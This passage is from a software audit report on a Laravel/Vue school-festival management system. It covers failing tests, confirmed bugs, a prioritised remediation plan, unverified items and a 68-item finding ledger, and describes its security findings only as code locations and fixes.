**Business impact:** Low today — this is uncommitted, in-progress work not yet part of any shipped Kalolsavam grading behavior, so it does not affect current production correctness. It is flagged because (a) it is a live, reproducible defect in the current working tree that a commit right now would ship broken, and (b) the isolation-vs-full-suite divergence is a signal worth investigating on its own, independent of this specific feature — if something in the suite is leaking state, other tests could be silently passing for the wrong reason too.

**Recommendation:** Before committing the in-progress `FestGradePointService`/`FestGradeConfig` change, investigate why `test_raw_score_bands_resolve_highest_match_regardless_of_storage_order` and `test_item_specific_band_takes_priority_over_event_wide` fail only under full-suite ordering — check for a static/memoized value on `FestGradePointService` or a `FestGradeConfig` query result not being reset between tests (e.g., an app-container singleton binding, or a static cache keyed by something not unique per test). Do not commit this change without both isolated and full-suite runs green.

### 7.5 `BUG-01` — Attendance-sheet PDF renders its report-header block twice on page 1
**Classification:** confirmed bug · **P2** · **Actor:** Sahodaya admin / school admin (report consumers)

**Expected:** A single-page (or first-page) DomPDF attendance-sheet export should show the branding header exactly once at the top, per the test's own explicit expectation (`assertSame(1, substr_count($html, 'class="report-header"'))`) and the code's own stated intent (continuation pages need a repeated header, not every page).

**Actual:** The rendered HTML contains the `report-header` block **twice** for a single-page report: once unconditionally at the top of the document (`attendance-sheet.blade.php:267`, outside the per-section loop), and again inside the `@forelse($reportSections as $sectionIndex => $section)` loop (:356) — gated only by `@if(empty($isPreview) && ($isDomPdf ?? true))` (:355), **not** additionally gated by `$sectionIndex > 0`, so it fires even for the first section, duplicating the header that already rendered globally. **Independently re-confirmed this pass** — see §7.2, row 4: `Failed asserting that 2 is identical to 1.`, byte-identical to the source claim.

**Recommendation:** Add `&& $sectionIndex > 0` to the condition at `attendance-sheet.blade.php:355`.

### 7.6 New ground covered this pass on two previously-"unresolved" items

**`SahodayaWebsiteSiteScopeTest::test_v2_microsite_navigation_stays_inside_the_microsite`** — the source dataset's `BUG-02` finding mentions this test only in passing, as an incidental source of evidence for a JSON-LD corruption bug, explicitly declining to identify *why the test itself fails* ("Neither test's actual failing assertion is about the JSON-LD block itself — see TG-01/other"). This pass captured the full assertion and advances the picture, without fully closing it: the failure is `assertSee('href="/m/innovation-expo#about-sahodaya"')` against the rendered microsite page — the actual nav renders distinct sub-page links (`/m/innovation-expo/about`, `/member-schools`, etc.) rather than in-page hash-anchor links, even though an `id="about-sahodaya"` section div still exists in the page body. This has the shape of the same stale-test-vs-intentional-navigation-refactor pattern as `TG-01`/`TG-02` (a site-builder change from anchor-based single-page nav to multi-page nav that the test wasn't updated for), but this pass did not confirm that with the same rigor as `TG-01`/`TG-02` — it remains genuinely open. Its captured HTML is also where `BUG-02`'s JSON-LD corruption (the literal string `"<?php $__contextArgs = []; ..."` in place of `"@context"` in the `<script type="application/ld+json">` block, caused by Blade's `@context` directive naively text-matching the identical PHP-array-literal string) is independently visible in this session's own run too — **confirming `BUG-02` fresh**, not merely transcribing it.

**`PlaintextPasswordRevealTest`** — the source data described this test's behavior without giving its exact method name. This pass's fresh run supplies it: `test_superadmin_tenants_show_does_not_ship_plaintext_password_but_reveal_endpoint_returns_it`, failing with `Property [sahodayaAdmins.0.password] was found while it was expected to be missing.` Confirms `SEC-02[TestExec]`'s own conclusion exactly: the shipped value is `null`, not a real password — a key-presence inconsistency, not a live disclosure.

### 7.7 Application log growth during test execution

**Source claim (`SUM-01`):** `storage/logs/laravel.log` grew by 98 lines across all of that pass's runs; 4 ERROR-level (all one root cause, `BUG-03`), 0 CRITICAL/EMERGENCY.

**This session's fresh measurement:** baseline 6,349 lines before this session's runs; 6,573 lines after (+224, across the OOM-crash attempt, the focused run, and the full run). Of those, exactly **3 ERROR-level**, **0 CRITICAL/EMERGENCY**:
- 2× `testing.ERROR: Board result publish pipeline failed after status update: SQLSTATE[HY000]: General error: 1 no such column: subject_id` — **byte-identical SQL and message** to `BUG-03`'s claim, confirmed fresh.
- 1× `testing.ERROR: SQLSTATE[HY000]: General error: 1 no such table: tenants` — from `ExampleTest`'s known-broken scaffold test (`TG-06`); the source's own SUM-01 pass evidently didn't isolate this one as a distinct ERROR-level entry, but it is the same root cause `TG-06` already describes.

### 7.8 `BUG-03` — Board-result publish silently swallows a SQL error in the awards pipeline
**Classification:** data-integrity issue · **P1** · **Actor:** Sahodaya admin

**Expected:** Publishing a board result should successfully run its full post-publish pipeline (ranking, awards computation including "Most Subject Toppers," API sync, topper certificate generation).

**Actual:** `AwardsEngine::awardMostSubjectToppers()` issues `->selectRaw('tenant_id, COUNT(DISTINCT subject_id) as c')` against `Topper::query()` (the `toppers` table) — but `toppers` has **no `subject_id` column** (confirmed against its migration: it has `subject_marks` jsonb, not a `subject_id` column; the relational per-subject data lives on the related `topper_subject_marks` table, which the same query correctly `whereHas`-joins but then still references the bare unqualified column name). This throws `SQLSTATE[HY000]: General error: 1 no such column: subject_id` on **every single invocation** — a deterministic, schema-level error, not data-dependent — **independently reproduced fresh this pass, twice, byte-for-byte identical SQL and message** (§7.7). `BoardResultVerificationController` deliberately wraps this pipeline in a try/catch specifically so "pipeline failure ... should not undo the publish" — meaning the status transition succeeds and the admin sees **no error at all**, while ranking/awards/certificate generation for that publish silently fails every time, logged only as "so it can be investigated and retried" with no evidence of an actual retry mechanism.

**Evidence:** `app/Services/BoardResults/AwardsEngine.php:168-214` (both `selectRaw` calls, :187 and :205); `BoardResultVerificationController.php:378-402` (catch/log site); `database/migrations/tenant/2026_05_24_000005_create_results_tables.php:26-42` (confirms no `subject_id` column on `toppers`).

**Impact:** Every board-result "publish" action silently fails to compute the "Most Subject Toppers" award and, since the exception aborts the rest of the pipeline, potentially the ranking/certificate steps after it — with zero user-facing indication. This matches the pattern of very recent `fix(subject-toppers)`/`fix(board-results)` commits already in this repo's history, suggesting it has been silently broken since whatever recent refactor moved subject-level marks off the `toppers` table.

**Recommendation:** Fix the two `selectRaw` queries to count distinct subjects via the `topper_subject_marks` relation; add a regression test that actually asserts `AcademicAward` rows get created — the current catch-and-log means no test currently catches this, since it doesn't fail any assertion.

### 7.9 Stale/miscalibrated tests (`TG-01`, `TG-02`, `TG-04`, `TG-05`, `TG-06`, `SEC-02[TestExec]`) — summary

Six of the seven identified-root-cause failures in §7.3 are **not application bugs** — they are tests that fell out of sync with an intentional, already-shipped behavior change:

- **`TG-01`** (3 tests) — `Tenant::getNameAttribute()` (`Tenant.php:60-71`) deliberately force-uppercases `name` for `type=school` tenants on every read; 3 tests across `SahodayaApiTest.php`/`TenantDomainTest.php` still assert the pre-uppercase mixed-case string. **Flagged as a genuine open design question, not just a stale test**: should an API/JSON consumer's partner-registered name really be force-transformed on every read, or should the accessor apply only in specific print/certificate contexts? This audit takes no position; recommends the product team decide.
- **`TG-02`** (1 test) — creates a `KalotsavEvent` fixture; the resolver under test (`SahodayaHomepageModeResolver`) queries `FestEvent` exclusively, a different model/table entirely. The test currently passes only by accident (it happens to hit the resolver's unrelated `homepage_mode_override_until` branch), meaning the `registration_open` code path it claims to cover has **zero real test coverage** today.
- **`TG-04`** (2 tests) — `BoardResultCertificationService::requiredReportDefinitions()` intentionally, per its own inline comment, now requires only 2 report types (not 4) for Class X leadership review; `syncReportRecords()` deliberately deletes stale `subject_toppers` rows left over from packages created under the old rule. Both tests assert the old 4-type rule.
- **`TG-05`** (1 test) — a hardcoded expected array has its two stream-ID variables listed in the wrong order relative to the test's own ascending `->sort()` on the actual side; the app's `->orderBy('sort_order')` and the test's own sort are both working correctly.
- **`TG-06`** (1 test) — Laravel's unmodified stock scaffold test (`ExampleTest.php`), missing `RefreshDatabase`; 500s with "no such table: tenants" when run without another test having already migrated the in-memory DB first in the same process. Dead placeholder coverage, not an app defect.
- **`SEC-02[TestExec]`** (1 test) — `TenantController::portalAdmins()` includes a `'password' => null` key even when the caller didn't opt into revealing it, rather than omitting the key entirely; Laravel's `missing()` fluent assertion treats a present-but-null key as "not missing." The actual value shipped is confirmed `null`, never the real password — a minor data-shape inconsistency, not a live credential leak.

### 7.10 Two failures whose root cause remains genuinely unresolved (`TG-08`, `TG-09`)

- **`TG-08`** — `TeacherTrainingEligibilityServiceTest::test_region_ids_via_school_assignment`: `Failed asserting that false is true.` The source audit explicitly flags this as not traced within its own time budget; this pass's fresh re-run reproduces the identical failure but did not go further either, given the scope of everything else this section already covers. **This could be a real eligibility-gating bug** (incorrectly admitting/rejecting teachers from region-restricted training programs) and should not be assumed benign.
- **`TG-09`** — `EmailTemplatesTest::test_verify_email_notification_renders_html_body`: a large rendered-HTML mismatch for the "Verify Sahodaya" email. This pass captured the actual side's opening HTML (`<!DOCTYPE html>...<meta charset="utf-8">...`) but did not diff it against the expected side to determine whether this is a benign template-copy change or a real rendering regression.

### 7.11 Frontend: build, typecheck, unit tests, e2e

| Check | Status | Evidence |
|---|---|---|
| **Build** (`npm run build`, Vite) | **PASS.** Independently re-run fresh this session: exit code `0`, `✓ built in 2.28s`, 1163 modules transformed, `public/build/manifest.json` regenerated. Source data reports the same (2 runs, 2.58s/2.79s, exit 0). Only non-asset output: one benign Node `[DEP0205]` deprecation notice, unrelated to app code. | `FE-BUILD-01` (not a gap, confirmatory) |
| **Typecheck** | **None exists.** Confirmed: no `tsconfig*.json`/`jsconfig*.json` at the repo root, no `typescript`/`vue-tsc` in `package.json` (only as transitive peer-deps of other packages, never installed direct), zero `.ts` files under `resources/` (the repo's only `.ts` file is `playwright.config.ts`), zero `lang="ts"` SFCs anywhere. A plain JavaScript Vue 3 + Inertia app with no static type analysis step at all. | `FE-TYPECHECK-01` (test gap, P2) |
| **Unit tests** | **None exist.** Confirmed: no `test`/`test:unit`/`vitest`/`jest` script in `package.json`, no `vitest.config*`/`jest.config*`, zero `*.spec.js`/`*.test.js` files anywhere outside `node_modules`/`vendor`. The only `*.spec.ts` files are the 10 Playwright **e2e** specs (browser-level, not component-level). | `FE-UNIT-01` (test gap, P2) |
| **E2E** | **NOT EXECUTED**, by design — per explicit task instructions, the Playwright suite needs a live dev server (`malappuramsahodaya.test:8000`/`superadmin.test:8000`) that could hang this session; this constraint was respected and not overridden. Reported statically only: `npx playwright test --list` (metadata-only, no browser, no network — confirmed safe) enumerates **45 tests across 10 spec files / 10 projects**. Fest/Kalolsavam-relevant coverage spans 4 files (`00-full-ux-audit.spec.ts`, `02-sahodaya-admin.spec.ts`, `03-school-admin.spec.ts`, `10-fest-features.spec.ts`) and is uniformly a shallow "page loads without a 500/redirect-to-login/visible-error-text/layout-overflow" smoke check — **no assertion anywhere checks fee amounts, phase transitions, report data values, or export file contents.** Most fest-specific tests are wrapped in `test.skip()` guards keyed to `php artisan e2e:seed-data` having been run first; absent that, they silently skip rather than validate. | `FE-E2E-01` (test gap, P2) |
| **E2E — orphaned spec file** | `tests/e2e/09-gap-completion.spec.ts` (2 tests, both touching fest-ops/sahodaya-admin flows) exists on disk but matches **no** `testMatch` pattern in `playwright.config.ts`'s 10 project entries — confirmed via `npx playwright test --list`, which enumerates exactly 45 tests with none from this file. Its 2 tests are unreachable by every configured script and silently never run. | `FE-E2E-02` (test gap, P3) |

**Recommendation set (frontend):** if the e2e suite runs in CI, confirm `php artisan e2e:seed-data` (+ `e2e:provision-users`) actually executes in the pipeline before fest-tagged specs run — otherwise those specs pass by skipping, not by validating, behind a green checkmark. Add a `testMatch` entry for `09-gap-completion.spec.ts` or fold its 2 tests into an adjacent covered spec. Consider incremental TypeScript adoption or Vitest coverage for the highest-risk, currently-mid-refactor components (`PhasedRegionBillingPanel.vue`, `FeesTab.vue`, `Settings.vue`, `ProgramHub.vue`, `Registration.vue` are all in the modified-files list for this branch) — today the only automated backstop for regressions in this display logic is the shallow Playwright smoke check plus manual QA.

---

## 8. Prioritized remediation plan

### Immediate (P0/P1 — fix before any real multi-region or multi-installment-payment tenant goes live)

1. **Close the region-scoping gap on the 4 legacy `FestExportController` routes** (`SEC-01[Lifecycle]`, P0) — delete the controller/routes, or wrap them in `region.report.scope` and pass a real `FestReportScope`. Do the same for the sibling legacy `export.fees` route (`RECON-04`, P1) and add the missing `EventLifecycleGate::allowResultReport()` call to `export.results` (`SEC-03[Lifecycle]`, P2) — all three live in the same controller and should be fixed together.
2. **Fix the 3 "paid" call sites** to read `amount_paid` instead of the last receipt (`RECON-01`, P1); **add `->forAmountAggregation()`** to the 4 flagged rollup-double-counting builders (`RECON-02`, P1).
3. **Neutralize CSV/Excel formula injection** with one shared helper applied at `ExcelExport::spreadsheetXml()`'s escape closure and every `fputcsv()`/manual-CSV call site (`SEC-01[SecAudit]`/`EXP-02`/`SEC-01[TestExec]`, P1/P2 — three views of the same bug class).
4. **Gate athletic records/live-data on `results_published`/`schedule_published`**, not just a feature toggle (`SEC-02[Lifecycle]`, P1).
5. **Fix `AwardsEngine::awardMostSubjectToppers()`'s SQL** so board-result publish stops silently failing its awards pipeline on every run (`BUG-03`, P1).
6. **Add a real unique index on `fest_groups(event_id, chest_no)`** and a uniqueness guard on `fest_participants(item_id, student_id)` (`TECH-01[TechAudit]`, P1); **add the missing lock/transaction to `promoteAllEligibleWaitlisted()`** (`TECH-03[TechAudit]`, P1).
7. **Register a Malayalam-capable font for Fest PDF exports** (`EXP-01`, P1) — this is a Kerala inter-school festival system; Malayalam names are the routine case, not an edge case.

### Near-term (P2 — before the next Sahodaya onboarding wave)

8. Make `phase_mode_enabled` events phase-aware for public visibility (`SEC-05[Lifecycle]`); fix the wrong-order lifecycle check blocking legitimate early per-phase exports (`SEC-06[Lifecycle]`).
9. Revoke `FestQualification` rows on results-unpublish, and add a `results_published` guard to `promoteWinners()` for plain (non-phased) events too (`SEC-04[Lifecycle]`).
10. Fix `forceApprove()` to use `waiver_amount` instead of overwriting the receipt, and add the same lock/overpayment-reconciliation `approve()` already has (`RECON-03`).
11. Add a UTF-8 BOM to every hand-rolled CSV export (`EXP-04`); rate-limit the public `/fest/*` route group (`SEC-02[SecAudit]`).
12. Add the missing `fest_marks(event_id)` index (`TECH-05[TechAudit]`); wrap `issueForSchoolBatch()` in a transaction (`TECH-07[TechAudit]`); fix the soft-delete/billing mismatch (`TECH-04[TechAudit]`).
13. Land the regression tests this section repeatedly calls for: preview-vs-export money parity (`RECON-06`), a permanent school-export-allowlist test (`RPT-02`), Malayalam round-trip export coverage (`EXP-03`), and the waitlist/chest-number/schema-constraint tests named in §6.
14. Investigate the `FestGradePointServiceGenericConfigTest` isolation-vs-full-suite divergence (§7.4) before committing that in-progress change.

### Hygiene (P3 — low urgency, batch together)

15. Delete `app/_to_delete/FestReportPolicy.php` and `app/_to_delete/RegionScope.php` (`SEC-05[SecAudit]`/`TECH-01[Lifecycle]`, confirmed dead twice over, independently).
16. Add the `$guarded` backstop to `FestEvent`/`FestSchoolEventFee` (`SEC-03[SecAudit]`); move the `results_published` check inside `publicWinnerRow()` itself (`SEC-04[SecAudit]`).
17. Update `FestSchoolReportBoundaryTest` to assert the redirect, not 404 (`RPT-03`/`TG-03`); fix the 5 other stale tests in §7.9; add a `testMatch` entry for `09-gap-completion.spec.ts` (`FE-E2E-02`).
18. Route Fest spreadsheet exports through the existing `SpreadsheetWriter`/openspout path for real `.xlsx` output (`EXP-07`); add a totals row to `itemCountsExcel()` (`EXP-08`); standardize `@forelse`/`@empty` across the 20 report views that lack it (`EXP-09`).
19. Fix the duplicate attendance-sheet header (`BUG-01`) and the `@context`-vs-Blade-directive JSON-LD corruption (`BUG-02`).
20. Delete or fix the leftover scratch test files (`tests/Feature/Events/ScratchFormulaInjectionAuditTest.php`, `tests/Unit/Services/Events/TmpVerifyMaxTeamsTest.php`) that are currently mixed into every suite run's counted totals (`TG-07`).

---

## 9. What this audit could not verify, and why

**The exact root cause of 2 named test failures.** `TG-08` (`TeacherTrainingEligibilityServiceTest::test_region_ids_via_school_assignment`) and `TG-09` (`EmailTemplatesTest::test_verify_email_notification_renders_html_body`) both fail, both were independently reproduced fresh in this session, and neither this audit's source data nor this pass's own additional digging determined *why*. Both are flagged, not silently dropped — see §7.10. Given `TG-08` concerns region-gated training-program eligibility, it should not be assumed benign without follow-up.

**The exact reason `SahodayaWebsiteSiteScopeTest::test_v2_microsite_navigation_stays_inside_the_microsite` fails.** This pass advanced the investigation further than the source data (identified the specific missing `href` assertion, §7.6) but did not confirm whether it reflects an intentional site-builder navigation refactor or a real defect.

**The exact mechanism behind the `FestGradePointServiceGenericConfigTest` isolation-vs-full-suite divergence** (§7.4). The *symptom* (passes alone, 2/4 fail under full-suite ordering) is proven with a live re-run; the *shared-state source* causing it was not bisected. This is new-this-pass evidence, entirely outside the source dataset's 68 findings.

**Whether the external Chromium PDF-conversion service (the non-dompdf production path) has Malayalam fonts installed.** `EXP-01` confirms dompdf's bundled font does not; the alternate `PDF_CONVERTER_URL` path is not present in this repository to inspect, so production correctness for that path is genuinely unknown, not assumed-fine either way.

**Whether `TG-01`'s tenant-name-uppercasing is correct product behavior.** This audit deliberately takes no position on whether `Tenant::getNameAttribute()` *should* force-uppercase school names in API/JSON responses — it flags the 3 tests currently disagreeing with that accessor and the underlying design question, and defers the call to product, consistent with this audit series' stated boundary of reporting gaps rather than making product decisions.

**Whether `EXP-06`'s `CsvExportDispatcher`-adjacent `ReportRunner`/`ErpReportQueryService` subsystem shares or avoids the Fest-specific memory/chunking gaps described in §5–6.** That subsystem is a separate, generic cross-domain ERP reporting layer that happens to touch some Fest-linked data as one of several sources; it was noted as a boundary case but not separately audited end-to-end here, since it sits outside this audit's Kalolsavam-module scope.

**Live production behavior for anything gated behind `TENANCY_DATABASE_PER_SAHODAYA=true` or a genuinely shared-DB multi-tenant deployment.** Per this audit series' established repo facts, the entire test suite runs against one in-memory SQLite database with per-tenant physical isolation forced off. `TECH-02[TechAudit]`'s cache-tenancy finding was strengthened this pass by manually engaging the real Stancl bootstrapper against a taggable cache store — a meaningfully closer proxy than a pure code trace — but this is still not the same as observing the real bootstrapper activate under the real, OS-level environment variable in a genuine two-tenant deployment, which no test in this repository exercises (a gap AUDIT_01 already flagged as `TIF-01` for the DB-isolation case specifically).

**Anything about report/export correctness for a real, populated multi-region or multi-Sahodaya tenant.** Per this audit series' repo facts (independently re-confirmed, not merely trusted, by this pass's own test runs and `finance:audit-payment-integrity` output), only Malappuram Sahodaya is genuinely seeded anywhere, with real activity limited to a handful of carriers/receipts. Every multi-region, multi-phase, or high-volume scenario in this report (`RPT-01`, `RECON-02`, `TECH-01[TechAudit]`, `TECH-03[TechAudit]`, etc.) was verified via code trace, existing tests, or a freshly-built and immediately-deleted throwaway fixture — never against a real tenant at that scale, because none exists in this repository to check against.

**Whether the 12 other of the 26/50 export ids not exercised by this pass's own scratch tests behave identically to the ones sampled.** `RPT-02`'s allowlist test, `RECON-04`'s IDOR test, and similar targeted checks each proved their specific claim for a specific export id; this audit does not claim to have individually re-verified all 50 catalog export ids or all 22 interactive pages against every finding category (authorization, lifecycle-gating, formula-injection, BOM) — RPT-10's broad confirmatory finding is explicitly a sampling-based positive, not an exhaustive one, and says so.

---

## Appendix: Master finding ledger (all 68 source findings)

| # | ID | Section | Classification | Sev | Summary |
|---|---|---|---|---|---|
| 1 | RPT-01 | Report inventory | data-integrity issue | P2 | Region-aware reports drop a phase's data on phase-based hubs |
| 2 | RPT-02 | Report inventory | test gap | P2 | Cross-school export block untested + 2 confirmed bypass routes |
| 3 | RPT-03 | Report inventory | test gap | P2 | `FestSchoolReportBoundaryTest` currently red (404 vs 302) |
| 4 | RPT-04 | Report inventory | missing feature | P2 | No State-tier consolidated results/points export |
| 5 | RPT-05 | Report inventory | report mismatch | P3 | Judge/staff "assignment list" reports don't exist |
| 6 | RPT-06 | Report inventory | report mismatch | P3 | No distinct-student headcount |
| 7 | RPT-07 | Report inventory | missing feature | P3 | No itemized refunds/adjustments register |
| 8 | RPT-08 | Report inventory | missing feature | P3 | Accommodation/lodging entirely absent |
| 9 | RPT-09 | Report inventory | product decision required | P3 | School-strength-category report — unclear requirement |
| 10 | RPT-10 | Report inventory | not a gap (confirmatory) | P3 | Bulk of requested report inventory confirmed solid |
| 11 | RECON-01 | Financial reconciliation | confirmed bug | **P1** | "Paid" shows last receipt, not accumulated total |
| 12 | RECON-02 | Financial reconciliation | report mismatch | **P1** | 4 builders double-count the fee rollup row |
| 13 | RECON-03 | Financial reconciliation | data-integrity issue | P2 | `forceApprove()` overwrites receipt instead of waiving |
| 14 | RECON-04 | Financial reconciliation | security issue | **P1** | Legacy fees-export route has zero region scoping (proven live) |
| 15 | RECON-05 | Financial reconciliation | not a gap (confirmatory) | P3 | Core reconciliation invariant + audit tools are sound |
| 16 | RECON-06 | Financial reconciliation | test gap | P2 | Zero tests touch the buggy report/export classes |
| 17 | SEC-01[SecAudit] | Security audit | security issue | **P1** | CSV/Excel formula injection across ~20+ call sites |
| 18 | SEC-02[SecAudit] | Security audit | security issue | P2 | No rate limiting on public `/fest/*` route group |
| 19 | SEC-03[SecAudit] | Security audit | security issue | P3 | No `$guarded` backstop on `FestEvent`/`FestSchoolEventFee` |
| 20 | SEC-04[SecAudit] | Security audit | security issue | P3 | Shared `publicWinnerRow()` has no internal gate |
| 21 | SEC-05[SecAudit] | Security audit | not a gap (confirmatory) | P3 | `_to_delete/FestReportPolicy.php` genuinely dead code |
| 22 | SEC-01[Lifecycle] | Report lifecycle | security issue | **P0** | 4 legacy export routes skip region-scoping entirely (proven live) |
| 23 | SEC-02[Lifecycle] | Report lifecycle | security issue | **P1** | Athletic records/live leak names+marks pre-publication |
| 24 | SEC-05[Lifecycle] | Report lifecycle | security issue | **P1** | No code is phase-aware for public visibility |
| 25 | SEC-06[Lifecycle] | Report lifecycle | broken workflow | P2 | Wrong-order lifecycle check blocks legit phase export |
| 26 | SEC-03[Lifecycle] | Report lifecycle | security issue | P2 | Legacy `export.results` has zero lifecycle gate |
| 27 | SEC-04[Lifecycle] | Report lifecycle | data-integrity issue | P2 | Unpublish never revokes downstream qualifications |
| 28 | TECH-01[Lifecycle] | Report lifecycle | not a gap (confirmatory) | P3 | Independent re-confirmation of dead policy file |
| 29 | POS-01 | Report lifecycle | not a gap (confirmatory) | P3 | Cross-tenant/cross-school/state boundaries correctly enforced |
| 30 | EXP-01 | Export quality | confirmed bug | **P1** | Malayalam renders as tofu boxes in every Fest PDF |
| 31 | EXP-02 | Export quality | security issue | P2 | CSV injection reproduced via live fees-export route |
| 32 | EXP-03 | Export quality | test gap | P2 | Zero Malayalam-script text anywhere in the test suite |
| 33 | EXP-04 | Export quality | data-integrity issue | P2 | No UTF-8 BOM on hand-rolled CSV exports |
| 34 | EXP-05 | Export quality | performance risk | P2 | No chunking; full XML built in memory before streaming |
| 35 | EXP-06 | Export quality | performance risk | P2 | No memory/time budget or async fallback for heavy exports |
| 36 | EXP-07 | Export quality | report mismatch | P3 | Downloads as `.xls` but is hand-built XML text |
| 37 | EXP-08 | Export quality | report mismatch | P3 | PDF shows totals; Excel version of same report doesn't |
| 38 | EXP-09 | Export quality | UI/navigation gap | P3 | 20/30 report views have no empty-state handling |
| 39 | TECH-01[TechAudit] | Technical audit | data-integrity issue | **P1** | Duplicate chest numbers / item registrations possible (proven live) |
| 40 | TECH-02[TechAudit] | Technical audit | security issue | P3 | Cross-tenant cache collision only if tagging bootstrapper inactive |
| 41 | TECH-03[TechAudit] | Technical audit | confirmed bug | **P1** | Waitlist promotion has no capacity lock (proven live) |
| 42 | TECH-04[TechAudit] | Technical audit | data-integrity issue | P2 | Soft-deleted students vanish from reports but stay billed |
| 43 | TECH-05[TechAudit] | Technical audit | performance risk | P2 | `fest_marks` has no usable `event_id` index |
| 44 | TECH-06[TechAudit] | Technical audit | performance risk | P2 | 5 report methods query per bucket inside a loop |
| 45 | TECH-07[TechAudit] | Technical audit | data-integrity issue | P2 | Batch invoice issuance is a non-atomic 2-step write |
| 46 | TECH-08[TechAudit] | Technical audit | performance risk | P2 | No chunking anywhere in the ~7,600-line report layer |
| 47 | TECH-09[TechAudit] | Technical audit | data-integrity issue | P3 | `fest_participants` missing 3 of 5 foreign keys |
| 48 | SUM-01 | Test execution | test gap | P2 | Test-run summary (see §7 in full) |
| 49 | TECH-01[TestExec] | Test execution | performance risk | P2 | `php artisan test` OOM-crashes under default memory_limit |
| 50 | SEC-01[TestExec] | Test execution | security issue | **P1** | Live HTTP proof of CSV injection via fees-export route |
| 51 | BUG-01 | Test execution | confirmed bug | P2 | Attendance-sheet PDF renders header twice on page 1 |
| 52 | BUG-02 | Test execution | confirmed bug | P2 | JSON-LD `@context` corrupted by Blade directive collision |
| 53 | BUG-03 | Test execution | data-integrity issue | **P1** | Board-result publish silently swallows an awards-pipeline SQL error |
| 54 | TG-01 | Test execution | test gap | P3 | 3 tests vs. intentional tenant-name uppercasing |
| 55 | TG-02 | Test execution | test gap | P3 | Test fixture uses wrong model — path under test has zero real coverage |
| 56 | TG-03 | Test execution | test gap | P3 | 404-vs-302 stale assertion (+ 1 unconfirmed second case) |
| 57 | TG-04 | Test execution | test gap | P3 | 2 tests vs. intentional certification-report-count change |
| 58 | TG-05 | Test execution | test gap | P3 | Hardcoded expected-array element order swapped |
| 59 | SEC-02[TestExec] | Test execution | security issue | P3 | Password-reveal key present-but-null vs. omitted |
| 60 | TG-06 | Test execution | test gap | P3 | Stock `ExampleTest` scaffold, missing `RefreshDatabase` |
| 61 | TG-07 | Test execution | test gap | P3 | Leftover scratch test files still in the tree |
| 62 | TG-08 | Test execution | test gap | P2 | Unresolved failure — training eligibility (flagged, not traced) |
| 63 | TG-09 | Test execution | report mismatch | P3 | Unresolved failure — email template HTML mismatch |
| 64 | FE-BUILD-01 | Test execution | not a gap (confirmatory) | P3 | `npm run build` passes cleanly |
| 65 | FE-TYPECHECK-01 | Test execution | test gap | P2 | No TypeScript/typecheck tooling exists at all |
| 66 | FE-UNIT-01 | Test execution | test gap | P2 | No frontend unit-testing setup exists at all |
| 67 | FE-E2E-01 | Test execution | test gap | P2 | E2E coverage is shallow page-load smoke checks only |
| 68 | FE-E2E-02 | Test execution | test gap | P3 | 1 spec file orphaned — unreachable by any configured project |

**Plus 1 finding generated by this audit's own fresh execution, outside the source 68** (§7.4): `FestGradePointServiceGenericConfigTest` — confirmed bug (test-isolation), P2, passes in isolation but 2/4 tests fail under full-suite ordering, in currently-uncommitted grade-banding code.
